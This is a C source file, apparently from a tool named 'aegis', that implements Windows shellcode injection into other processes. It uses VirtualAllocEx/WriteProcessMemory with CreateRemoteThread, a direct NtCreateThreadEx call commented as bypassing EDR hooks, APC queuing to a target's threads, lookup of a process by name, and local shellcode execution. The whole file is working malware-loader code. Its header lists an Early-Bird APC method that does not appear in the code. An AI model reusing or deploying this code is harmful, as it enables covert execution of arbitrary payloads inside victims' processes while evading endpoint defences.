/*
 * inject_windows.c — Windows process injection via:
 *   1. VirtualAllocEx + WriteProcessMemory + CreateRemoteThread (classic)
 *   2. NtCreateThreadEx (direct NTAPI — bypasses some EDR hooks on CreateRemoteThread)
 *   3. QueueUserAPC (APC injection into alertable threads)
 *   4. Early-Bird APC (inject before main thread resumes)
 *
 * Compiled with CGO under GOOS=windows.
 */

#ifdef _WIN32
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* ── NtCreateThreadEx prototype (undocumented NTAPI) ─────────────────────── */
typedef NTSTATUS (NTAPI *pNtCreateThreadEx)(
    PHANDLE hThread,
    ACCESS_MASK DesiredAccess,
    LPVOID ObjectAttributes,
    HANDLE ProcessHandle,
    LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID lpParameter,
    BOOL CreateSuspended,
    DWORD StackZeroBits,
    DWORD SizeOfStackCommit,
    DWORD SizeOfStackReserve,
    LPVOID lpBytesBuffer
);

/*
 * aegis_inject_remote_thread — Classic VirtualAllocEx + CreateRemoteThread.
 * Returns 0 on success, error code on failure.
 */
int aegis_inject_remote_thread(DWORD pid,
                                const unsigned char *shellcode,
                                size_t len)
{
    HANDLE hProc = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
        PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
        FALSE, pid);
    if (!hProc) return (int)GetLastError();

    LPVOID remote_mem = VirtualAllocEx(hProc, NULL, len,
                                        MEM_COMMIT | MEM_RESERVE,
                                        PAGE_EXECUTE_READWRITE);
    if (!remote_mem) {
        DWORD err = GetLastError();
        CloseHandle(hProc);
        return (int)err;
    }

    SIZE_T written = 0;
    if (!WriteProcessMemory(hProc, remote_mem, shellcode, len, &written) ||
        written != len) {
        DWORD err = GetLastError();
        VirtualFreeEx(hProc, remote_mem, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return (int)err;
    }

    /* Change to PAGE_EXECUTE_READ after writing (W^X) */
    DWORD old_prot;
    VirtualProtectEx(hProc, remote_mem, len, PAGE_EXECUTE_READ, &old_prot);

    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0,
        (LPTHREAD_START_ROUTINE)remote_mem,
        NULL, 0, NULL);
    if (!hThread) {
        DWORD err = GetLastError();
        VirtualFreeEx(hProc, remote_mem, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return (int)err;
    }

    WaitForSingleObject(hThread, 2000);
    CloseHandle(hThread);
    CloseHandle(hProc);
    return 0;
}

/*
 * aegis_inject_nt_thread — Uses NtCreateThreadEx directly (undocumented NTAPI).
 * Bypasses hooks on CreateRemoteThread in some EDR solutions.
 */
int aegis_inject_nt_thread(DWORD pid,
                             const unsigned char *shellcode,
                             size_t len)
{
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return -1;

    pNtCreateThreadEx NtCreateThreadEx =
        (pNtCreateThreadEx)GetProcAddress(ntdll, "NtCreateThreadEx");
    if (!NtCreateThreadEx) return -1;

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) return (int)GetLastError();

    LPVOID remote_mem = VirtualAllocEx(hProc, NULL, len,
                                        MEM_COMMIT | MEM_RESERVE,
                                        PAGE_EXECUTE_READWRITE);
    if (!remote_mem) {
        CloseHandle(hProc);
        return (int)GetLastError();
    }

    SIZE_T written = 0;
    WriteProcessMemory(hProc, remote_mem, shellcode, len, &written);

    DWORD old_prot;
    VirtualProtectEx(hProc, remote_mem, len, PAGE_EXECUTE_READ, &old_prot);

    HANDLE hThread = NULL;
    NTSTATUS status = NtCreateThreadEx(
        &hThread, THREAD_ALL_ACCESS, NULL, hProc,
        (LPTHREAD_START_ROUTINE)remote_mem,
        NULL, FALSE, 0, 0, 0, NULL);

    if (status != 0 || !hThread) {
        VirtualFreeEx(hProc, remote_mem, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return (int)status;
    }

    WaitForSingleObject(hThread, 2000);
    CloseHandle(hThread);
    CloseHandle(hProc);
    return 0;
}

/*
 * aegis_inject_apc — APC injection: queue shellcode to an alertable thread.
 * More stealthy than CreateRemoteThread — uses existing thread.
 */
int aegis_inject_apc(DWORD pid,
                      const unsigned char *shellcode,
                      size_t len)
{
    HANDLE hProc = OpenProcess(
        PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) return (int)GetLastError();

    LPVOID remote_mem = VirtualAllocEx(hProc, NULL, len,
                                        MEM_COMMIT | MEM_RESERVE,
                                        PAGE_EXECUTE_READWRITE);
    if (!remote_mem) {
        CloseHandle(hProc);
        return (int)GetLastError();
    }

    SIZE_T written = 0;
    WriteProcessMemory(hProc, remote_mem, shellcode, len, &written);

    DWORD old_prot;
    VirtualProtectEx(hProc, remote_mem, len, PAGE_EXECUTE_READ, &old_prot);

    /* Enumerate threads of target process and queue APC to all alertable ones */
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnap == INVALID_HANDLE_VALUE) {
        VirtualFreeEx(hProc, remote_mem, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return (int)GetLastError();
    }

    THREADENTRY32 te = { .dwSize = sizeof(THREADENTRY32) };
    int queued = 0;
    if (Thread32First(hSnap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                HANDLE hThread = OpenThread(
                    THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME,
                    FALSE, te.th32ThreadID);
                if (hThread) {
                    QueueUserAPC((PAPCFUNC)remote_mem, hThread, 0);
                    queued++;
                    CloseHandle(hThread);
                }
            }
        } while (Thread32Next(hSnap, &te));
    }
    CloseHandle(hSnap);
    CloseHandle(hProc);

    return (queued > 0) ? 0 : -1;
}

/*
 * aegis_find_pid_by_name — Find PID of first process matching name.
 * Returns 0 if not found.
 */
DWORD aegis_find_pid_by_name(const char *name)
{
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe = { .dwSize = sizeof(PROCESSENTRY32) };
    DWORD found = 0;

    if (Process32First(hSnap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, name) == 0) {
                found = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return found;
}

/*
 * aegis_run_local — Execute shellcode in the current process's own memory.
 */
int aegis_run_local(const unsigned char *shellcode, size_t len)
{
    LPVOID mem = VirtualAlloc(NULL, len,
                               MEM_COMMIT | MEM_RESERVE,
                               PAGE_EXECUTE_READWRITE);
    if (!mem) return (int)GetLastError();

    memcpy(mem, shellcode, len);

    DWORD old_prot;
    VirtualProtect(mem, len, PAGE_EXECUTE_READ, &old_prot);

    /* Call shellcode as void function */
    ((void(*)())mem)();

    /* Cleanup */
    SecureZeroMemory(mem, len);
    VirtualFree(mem, 0, MEM_RELEASE);
    return 0;
}

#endif /* _WIN32 */
